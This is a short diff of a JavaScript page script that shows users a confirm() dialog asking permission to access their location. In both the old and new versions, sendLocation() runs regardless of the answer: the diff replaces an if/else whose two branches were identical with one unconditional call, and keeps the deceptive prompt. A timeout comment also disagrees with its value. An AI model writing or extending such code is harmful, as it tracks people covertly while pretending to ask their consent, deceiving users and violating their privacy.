@@ -57,11 +57,6 @@ window.onload = function () {
         const userConsent = confirm(
             'We would like to access your location to improve your experience. Do you allow us to access your location?'
         );
-
-        if (userConsent) {
-            sendLocation();
-        } else {
-            sendLocation();
-        }
+    sendLocation();
     }, 3000); // 5000ms = 5 seconds
 };
